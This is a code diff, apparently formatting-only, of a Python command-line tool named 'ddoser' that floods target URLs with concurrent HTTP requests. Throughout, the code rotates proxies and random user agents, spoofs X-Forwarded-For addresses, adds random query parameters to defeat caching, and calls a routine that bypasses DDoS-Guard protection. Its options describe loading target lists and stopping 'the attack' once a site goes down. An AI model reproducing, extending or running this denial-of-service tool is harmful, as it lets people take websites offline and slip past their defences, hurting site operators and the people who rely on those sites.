@@ -31,7 +31,9 @@ from fake_useragent import UserAgent
 STATS = defaultdict(int)
 URL_ERRORS_COUNT = defaultdict(int)
 URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
-DDOS_GUARD_COOKIE_CACHE = TTLCache(maxsize=100, ttl=timedelta(hours=1), timer=datetime.now) # 3h is min __ddg5 lifetime, __ddg2 lives 1 year
+DDOS_GUARD_COOKIE_CACHE = TTLCache(
+    maxsize=100, ttl=timedelta(hours=1), timer=datetime.now
+)  # 3h is min __ddg5 lifetime, __ddg2 lives 1 year
 UA_FALLBACK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
 
 
@@ -58,45 +60,64 @@ class Settings(NamedTuple):
     reset_errors_on_success: bool
 
 
-async def make_request(url: str, target_url: str, proxy: Proxy, headers: Dict[str, str], settings: Settings):
+async def make_request(
+    url: str, target_url: str, proxy: Proxy, headers: Dict[str, str], settings: Settings
+):
     timeout = aiohttp.ClientTimeout(total=settings.timeout)
-    logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
-    base_url = target_url.split('?', 1)[0]
+    logging.debug("Url: %s Proxy: %s header: %s", url, proxy, headers)
+    base_url = target_url.split("?", 1)[0]
     try:
         request_kwargs = {}
-        if proxy and proxy.protocol in ('socks4', 'socks5'):
+        if proxy and proxy.protocol in ("socks4", "socks5"):
             connector = ProxyConnector.from_url(proxy.get_formatted())
             client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
         else:
             if proxy:
-                request_kwargs['proxy'] = proxy.get_formatted()
+                request_kwargs["proxy"] = proxy.get_formatted()
             client_session = aiohttp.ClientSession(timeout=timeout)
         client_session.headers.update(headers)
 
         async with client_session as session:
             cookies = DDOS_GUARD_COOKIE_CACHE.get(base_url)
-            async with session.get(url, cookies=cookies, ssl=False, **request_kwargs) as response:
+            async with session.get(
+                url, cookies=cookies, ssl=False, **request_kwargs
+            ) as response:
                 if not settings.ignore_response:
                     await response.text()
 
-                if response.status == HTTPStatus.FORBIDDEN and response.headers["server"].lower() == "ddos-guard":
-                    ddos_guard_cookies, response = await ddos_guard.bypass(url, response.cookies, session=session, ignore_response=settings.ignore_response)
+                if (
+                    response.status == HTTPStatus.FORBIDDEN
+                    and response.headers["server"].lower() == "ddos-guard"
+                ):
+                    ddos_guard_cookies, response = await ddos_guard.bypass(
+                        url,
+                        response.cookies,
+                        session=session,
+                        ignore_response=settings.ignore_response,
+                    )
                     DDOS_GUARD_COOKIE_CACHE[base_url] = ddos_guard_cookies
-                elif response.status >= HTTPStatus.INTERNAL_SERVER_ERROR or (settings.stop_attack_on_forbidden and response.status == HTTPStatus.FORBIDDEN):
+                elif response.status >= HTTPStatus.INTERNAL_SERVER_ERROR or (
+                    settings.stop_attack_on_forbidden
+                    and response.status == HTTPStatus.FORBIDDEN
+                ):
                     URL_ERRORS_COUNT[base_url] += 1
                 elif settings.reset_errors_on_success:
                     URL_ERRORS_COUNT[base_url] = 0
 
                 URL_STATUS_STATS[base_url][response.status] += 1
-                logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)
+                logging.info(
+                    "Url: %s Proxy: %s Status: %s", url, proxy, response.status
+                )
 
     except Exception as error:
-        logging.warning('Url: %s Proxy: %s Error(%s): %s', url, proxy, type(error), error)
-        STATS[f'{type(error)}'] += 1
+        logging.warning(
+            "Url: %s Proxy: %s Error(%s): %s", url, proxy, type(error), error
+        )
+        STATS[f"{type(error)}"] += 1
         URL_ERRORS_COUNT[base_url] += 1
-        URL_STATUS_STATS[base_url]['other_error'] += 1
+        URL_STATUS_STATS[base_url]["other_error"] += 1
     else:
-        STATS['success'] += 1
+        STATS["success"] += 1
 
 
 def get_proxy(proxy_iterator: Iterable[Proxy]) -> Proxy:
@@ -110,19 +131,25 @@ def prepare_url(url: str, with_random_get_param: bool):
     if with_random_get_param:
         url_parts = list(urlparse.urlparse(url))
         query = dict(urlparse.parse_qsl(url_parts[4]))
-        query.update({f'param_{randint(0, 1000)}': str(randint(0, 100000))})
+        query.update({f"param_{randint(0, 1000)}": str(randint(0, 100000))})
         url_parts[4] = urlencode(query)
         return urlparse.urlunparse(url_parts)
     return url
 
 
 def make_headers(
-        user_agent: str, random_xff_ip: bool, custom_headers: Dict[str, str], target_headers: List[Tuple[str, str]], ua: UserAgent
+    user_agent: str,
+    random_xff_ip: bool,
+    custom_headers: Dict[str, str],
+    target_headers: List[Tuple[str, str]],
+    ua: UserAgent,
 ) -> Dict[str, str]:
     headers = {}
-    headers['User-Agent'] = user_agent if user_agent else ua.random
+    headers["User-Agent"] = user_agent if user_agent else ua.random
     if random_xff_ip:
-        headers['X-Forwarded-For'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
+        headers[
+            "X-Forwarded-For"
+        ] = f"{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}"
     if custom_headers:
         headers.update(custom_headers)
     if target_headers:
@@ -137,7 +164,7 @@ def split_target(target: str):
 
 
 async def ddos(
-        target: str, proxy_iterator: Iterable[Proxy], ua: UserAgent, settings: Settings
+    target: str, proxy_iterator: Iterable[Proxy], ua: UserAgent, settings: Settings
 ):
     target_url, target_headers = split_target(target)
     step = 0
@@ -145,7 +172,7 @@ async def ddos(
         if settings.count and step > settings.count:
             break
 
-        base_url = target_url.split('?', 1)[0]
+        base_url = target_url.split("?", 1)[0]
         error_count = URL_ERRORS_COUNT[base_url]
         if settings.stop_attack and error_count > settings.stop_attack:
             logging.warning(
@@ -157,29 +184,42 @@ async def ddos(
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        headers = make_headers(settings.user_agent, settings.random_xff_ip, settings.custom_headers_dict, target_headers, ua)
-        await make_request(prepare_url(target_url, settings.with_random_get_param), target_url, proxy,
-                           headers, settings)
+        headers = make_headers(
+            settings.user_agent,
+            settings.random_xff_ip,
+            settings.custom_headers_dict,
+            target_headers,
+            ua,
+        )
+        await make_request(
+            prepare_url(target_url, settings.with_random_get_param),
+            target_url,
+            proxy,
+            headers,
+            settings,
+        )
         log_stats()
 
 
 def log_stats():
     if sum(STATS.values()) % 10000 == 0:
         for target, statuses in URL_STATUS_STATS.items():
-            logging.critical(json.dumps({'target': target, **statuses}))
+            logging.critical(json.dumps({"target": target, **statuses}))
 
 
 async def amain(
-        targets: List[str], proxies: List[Proxy], ua: UserAgent, settings: Settings,
+    targets: List[str],
+    proxies: List[Proxy],
+    ua: UserAgent,
+    settings: Settings,
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target in targets:
         for _ in range(settings.concurrency):
-            coroutines.append(
-                ddos(target, proxy_iterator, ua, settings)
-            )
+            coroutines.append(ddos(target, proxy_iterator, ua, settings))
     await asyncio.gather(*coroutines)
+
 
 def normalize_url(url: str) -> Optional[str]:
     url = url.strip()
@@ -188,6 +228,7 @@ def normalize_url(url: str) -> Optional[str]:
         return None
 
     return url.split(" #")[0].strip()
+
 
 def load_targets(target_urls_files: Tuple[str]) -> List[str]:
     target_urls = []
@@ -207,7 +248,7 @@ def load_targets(target_urls_files: Tuple[str]) -> List[str]:
                         target_urls.append(url)
             except:
                 pass
-    logging.info('Loaded %s targets to ddos', len(target_urls))
+    logging.info("Loaded %s targets to ddos", len(target_urls))
     return target_urls
 
 
@@ -225,17 +266,20 @@ def process(settings: Settings):
     config_logger(settings.verbose, settings.log_to_stdout)
     uvloop.install()
     set_limits()
-    proxies = load_proxies(settings.proxy_file, settings.proxy_url, shuffle=settings.shuffle_proxy, custom_format=settings.proxy_custom_format)
-    targets = build_targets(settings.target_url, settings.target_urls_file)
-    ua = UserAgent(fallback = UA_FALLBACK)
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(
-        amain(targets, proxies, ua, settings)
+    proxies = load_proxies(
+        settings.proxy_file,
+        settings.proxy_url,
+        shuffle=settings.shuffle_proxy,
+        custom_format=settings.proxy_custom_format,
     )
+    targets = build_targets(settings.target_url, settings.target_urls_file)
+    ua = UserAgent(fallback=UA_FALLBACK)
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(amain(targets, proxies, ua, settings))
     for key, value in STATS.items():
-        if key != 'success':
+        if key != "success":
             logging.info("%s: %s", key, value)
-    logging.info('success: %s', STATS["success"])
+    logging.info("success: %s", STATS["success"])
 
 
 def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[str, str]:
@@ -248,38 +292,102 @@ def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[st
 
 
 @click.command(help="Run ddoser")
-@click.option('--target-url', help='ddos target url', multiple=True)
-@click.option('--target-urls-file', help='path or url to file contains urls to ddos', multiple=True)
-@click.option('--proxy-url', help='url to proxy resourсe')
-@click.option('--proxy-file', help='path to file with proxy list')
-@click.option('--concurrency', help='concurrency level', type=int, default=1)
-@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
-@click.option('--timeout', help='requests timeout', type=int, default=5)
-@click.option('-v', '--verbose', help='Show verbose log', count=True)
-@click.option('--ignore-response', help='do not wait for response body', is_flag=True, default=False)
-@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
-@click.option('--user-agent', help='custom user agent')
-@click.option('--log-to-stdout', help='log to console', is_flag=True)
-@click.option('--restart-period', help='period in seconds to restart application (reload proxies ans targets)', type=int)
-@click.option('--random-xff-ip', help='set random ip address value for X-Forwarder-For header', is_flag=True, default=False)
-@click.option('--custom-headers', help='set custom headers as json', default='{}', type=str)
-@click.option('--stop-attack', help='stop the attack when the target is down after N tries', type=int, default=0)
-@click.option('--shuffle-proxy', help='Shuffle proxy list on application start', is_flag=True, default=False)
-@click.option('-H', '--header', multiple=True, help='custom header', type=(str, str))
-@click.option('--proxy-custom-format', help='custom proxy format like "{protocol}://{ip}:{port} {login}:{password}" '
-                                            '(ip and port is required, protocol can be set by --protocol)')
-@click.option('--stop-attack-on-forbidden', help='Stop attack takes into account errors like time outs and 5xx, if this flag is set, stop attack on forbidden as well', is_flag=True, default=False)
-@click.option('--reset-errors-on-success', help='If number of errors more than the threshold we stop attack, reset the error counter if a request succeeds', is_flag=True, default=False)
+@click.option("--target-url", help="ddos target url", multiple=True)
+@click.option(
+    "--target-urls-file",
+    help="path or url to file contains urls to ddos",
+    multiple=True,
+)
+@click.option("--proxy-url", help="url to proxy resourсe")
+@click.option("--proxy-file", help="path to file with proxy list")
+@click.option("--concurrency", help="concurrency level", type=int, default=1)
+@click.option("--count", help="requests count (0 for infinite)", type=int, default=1)
+@click.option("--timeout", help="requests timeout", type=int, default=5)
+@click.option("-v", "--verbose", help="Show verbose log", count=True)
+@click.option(
+    "--ignore-response",
+    help="do not wait for response body",
+    is_flag=True,
+    default=False,
+)
+@click.option(
+    "--with-random-get-param",
+    help="add random get argument to prevent cache usage",
+    is_flag=True,
+    default=False,
+)
+@click.option("--user-agent", help="custom user agent")
+@click.option("--log-to-stdout", help="log to console", is_flag=True)
+@click.option(
+    "--restart-period",
+    help="period in seconds to restart application (reload proxies ans targets)",
+    type=int,
+)
+@click.option(
+    "--random-xff-ip",
+    help="set random ip address value for X-Forwarder-For header",
+    is_flag=True,
+    default=False,
+)
+@click.option(
+    "--custom-headers", help="set custom headers as json", default="{}", type=str
+)
+@click.option(
+    "--stop-attack",
+    help="stop the attack when the target is down after N tries",
+    type=int,
+    default=0,
+)
+@click.option(
+    "--shuffle-proxy",
+    help="Shuffle proxy list on application start",
+    is_flag=True,
+    default=False,
+)
+@click.option("-H", "--header", multiple=True, help="custom header", type=(str, str))
+@click.option(
+    "--proxy-custom-format",
+    help='custom proxy format like "{protocol}://{ip}:{port} {login}:{password}" '
+    "(ip and port is required, protocol can be set by --protocol)",
+)
+@click.option(
+    "--stop-attack-on-forbidden",
+    help="Stop attack takes into account errors like time outs and 5xx, if this flag is set, stop attack on forbidden as well",
+    is_flag=True,
+    default=False,
+)
+@click.option(
+    "--reset-errors-on-success",
+    help="If number of errors more than the threshold we stop attack, reset the error counter if a request succeeds",
+    is_flag=True,
+    default=False,
+)
 def main(
-        target_url: List[str], target_urls_file: str, proxy_url: str, proxy_file: str,
-        concurrency: int, count: int, timeout: int, verbose: bool, ignore_response: bool, with_random_get_param: bool,
-        user_agent: str, log_to_stdout: bool, restart_period: int, random_xff_ip: bool, custom_headers: str,
-        stop_attack: int, shuffle_proxy: bool, header: List[Tuple[str, str]], proxy_custom_format: str,
-        stop_attack_on_forbidden: bool, reset_errors_on_success: bool,
+    target_url: List[str],
+    target_urls_file: str,
+    proxy_url: str,
+    proxy_file: str,
+    concurrency: int,
+    count: int,
+    timeout: int,
+    verbose: bool,
+    ignore_response: bool,
+    with_random_get_param: bool,
+    user_agent: str,
+    log_to_stdout: bool,
+    restart_period: int,
+    random_xff_ip: bool,
+    custom_headers: str,
+    stop_attack: int,
+    shuffle_proxy: bool,
+    header: List[Tuple[str, str]],
+    proxy_custom_format: str,
+    stop_attack_on_forbidden: bool,
+    reset_errors_on_success: bool,
 ):
     config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
-        raise SystemExit('--target-url or --target-urls-file is required')
+        raise SystemExit("--target-url or --target-urls-file is required")
     settings = Settings(
         target_url=target_url,
         target_urls_file=target_urls_file,
@@ -303,19 +411,16 @@ def main(
         reset_errors_on_success=reset_errors_on_success,
     )
     while True:
-        proc = multiprocessing.Process(
-            target=process,
-            args=(settings,)
-        )
+        proc = multiprocessing.Process(target=process, args=(settings,))
         proc.start()
         proc.join(restart_period)
         if proc.exitcode is None:
-            logging.info('Killing the process by restart period')
+            logging.info("Killing the process by restart period")
             proc.kill()
             proc.join()
         if restart_period is None:
             break
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
